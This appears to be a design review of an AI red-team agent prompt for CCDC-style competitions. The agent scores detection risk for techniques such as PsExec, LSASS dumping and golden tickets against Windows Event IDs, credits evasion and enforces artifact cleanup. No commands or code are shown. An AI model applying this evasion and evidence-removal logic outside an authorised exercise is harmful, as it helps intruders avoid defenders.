VRP Injection Point states "Load Windows-Event-ID-Detection-Mapping as risk-scoring reference table" at initialization, but fabricated prompt hardcodes risk values (PsExec +40, LSASS +45, golden ticket +50) without showing actual collection injection or runtime consultation. Library Specification mandates "Refresh cadence: Monthly (EDR updates)" but if GROVES uses hardcoded initialization-time values, monthly updates to Lattice collection don't affect GROVES' decisions. Either the hardcoded values are illustrative (actual values injected from collection at init; add sample query pattern showing "Load 'PsExec: Event 7045' from collection → retrieve base_risk field"), OR move all base risk values into a queryable Runtime-Risk-Baseline collection with per-session fallback values hardcoded. Current prompt leaves this ambiguous.

---

## Verdict Rationale

GROVES is a high-fidelity specialist agent with load-bearing authorization authority; expertise density reflects Curie research integration; VRP is complete with domain-specific fallback. Three operational gaps prevent "READY" deployment: scope amendment recovery path undefined, JOLIOT Blue Team discovery signal path absent (load-bearing for dynamic recalibration), and Windows-Event-ID-Detection-Mapping injection mechanism not shown (hardcoded values may diverge from live Lattice). Recommend operator briefing addressing these three gaps; production use will refine integration details.

---

# BOHR STRUCTURAL REVIEW

---

## BOHR REVIEW: GROVES
**Verdict:** APPROVED WITH CONCERNS

### Schema Compliance
- Required sections present (Identity, Expertise, Coordination, Constraints, Validation): **YES** ✓
- Coordination Protocol format (READS / WRITES / ESCALATES): **COMPLIANT**
  - READS: 5 sources (ENGAGEMENT-SCOPE.md, ENGAGEMENT-CONTEXT-PROFILE, ATTACK-SURFACE-MAP.md, DETECTION-RISK-LOG.md, Operational-State-Current)
  - WRITES: 2 outputs + real-time alerts
  - ESCALATES TO: Operator (named authority)
- Operating Constraints (≥3 required, ≥5 expected): **5 present — COMPLIANT**
  - Scope enforcement immutable | Pre-action assessment | Blue Team inference mandatory | Threshold gating hard-stop | Artifact cleanup binding
- Validation Requirements present: **YES** (3: scope boundary, risk accuracy, Blue Team confidence) ✓
- Scope boundaries (positive AND negative): **YES**
  - Positive: "Block out-of-scope actions without exception"; immutable engagement ranges
  - Negative: "GROVES does NOT execute operations, conduct reconnaissance, or perform exploitations"
- Library Specification present (vector-enabled): **YES** ✓ (3 collections with content examples table)
- VRP present (vector-enabled): **YES** ✓ (Query formulation with good/poor examples; injection points; citation format)
- VRP Fallback (hard failure if absent): **YES** ✓ (3 explicit conditions: server unreachable, empty profile, incomplete mapping)

### Design Principle Compliance
- **Local-first:** COMPLIANT — operates on shared ENGAGEMENT-*.md files, no cloud assumptions embedded in coordination logic
- **Vendor-agnostic:** **VIOLATION — Windows-only context**
  - Expertise section hardcoded to Windows Event IDs (7045, 4769, 4688, 10, 4698, 1102, 20730), Windows tools (PsExec, WMI, AuditPol, schtasks, LSASS, procdump, mimikatz), AD/Kerberos architecture
  - No POSIX/Linux/macOS EDR/monitoring equivalent offered
  - Context appropriate for CCDC red team (Windows-heavy), but violates pure vendor-agnostic principle
  - **Acceptable with documented scope caveat**
- **OS-agnostic:** **VIOLATION (same root cause as vendor-agnostic)**
  - Agent assumes Windows target infrastructure exclusively
  - Future non-Windows engagements require GROVES variant or re-architecture

### Cross-Reference Quality
- Coordination Protocol names actual files: **YES** (consistent naming: ENGAGEMENT-SCOPE.md, ATTACK-SURFACE-MAP.md, DETECTION-RISK-LOG.md, OPERATIONAL-TIMELINE.md)
- Escalation targets named by codename: **YES** (Operator, appropriate as final authority)
- VRP collections match Library Specification: **YES** (3 collections in both sections; alignment confirmed)

### Concerns

| ID | Section | Gap |
|---|---|---|
| **C1** | Expertise Profile, Operating Constraints | **OS-specificity unacknowledged.** Windows Event IDs, LSASS, AuditPol, PsExec, schtasks assumed exclusively. No explicit statement "Windows-only engagement" or fallback to Linux/macOS monitoring analogues. Recommend: scope note stating target OS requirement or offer parallel GROVES-LINUX variant. |
| **C2** | Library Specification & Vector Retrieval Protocol | **Operational-State-Current injection mechanism undefined.** VRP states "append summary every 5 minutes" but does NOT specify: (a) Which component injects (coordinator? agent relay?)? (b) How does polling happen if agent busy (blocking or async)? (c) Stale data fallback if cycle misses? Recommend: explicit coordinator responsibility + timing SLA. |
| **C3** | Vector Retrieval Protocol — Fallback | **Stale data edge case missing.** Fallback Condition 1 (vector server unreachable) defined, but no fallback for stale Operational-State-Current (last action >60 min old). Rolling average calculation becomes invalid. Recommend: add Condition 4: "If last action timestamp >60 min old, reset rolling average to +0; log stale context to operator." |
| **C4** | Coordination Protocol — READS | **Source-of-truth conflict undefined.** DETECTION-RISK-LOG.md (agent-written in real-time) overlaps with Operational-State-Current (injected every 5 min, 4-min lag possible). If scores diverge, which wins for threshold calculation? Recommend: explicit precedence rule ("use DETECTION-RISK-LOG as primary; reconcile Operational-State-Current on divergence >10 points"). |
| **C5** | Validation Requirements #3, Operating Constraint #3 | **Blue Team confirmation timing implicit.** Constraint 3 requires "Blue Team product confirmed" before evasion credits apply, but JOLIOT discovery (source of confirmation) is async and may lag action request. Current text ("require operator briefing or infer via JOLIOT") silent on blocking behavior. Recommend: explicit: "If Blue Team posture unknown at action request, block action and escalate to operator for manual briefing or accept +1.2x risk baseline." |
| **C6** | Operating Constraint #5 | **Artifact cleanup enforcement mechanism missing.** Constraint states "failure to comply creates persistent evidence" but does NOT specify GROVES action if cleanup directive ignored (escalate? block future actions? audit log only?). Recommend: add enforcement tier: "Log non-compliance to OPERATIONAL-TIMELINE; escalate to operator if cleanup compliance <80% by engagement end." |

### Recommendation

GROVES is structurally sound and deployable in **Windows-only red team contexts** (CCDC/CPTC scope) with 6 documented gaps; all gaps are procedural/editorial, not structural failures—add explicit Windows-scope caveat, clarify Operational-State-Current injection responsibility, define stale-data fallback, resolve DETECTION-RISK-LOG source-of-truth precedence, lock Blue Team confirmation timing dependency, and specify cleanup-directive audit enforcement.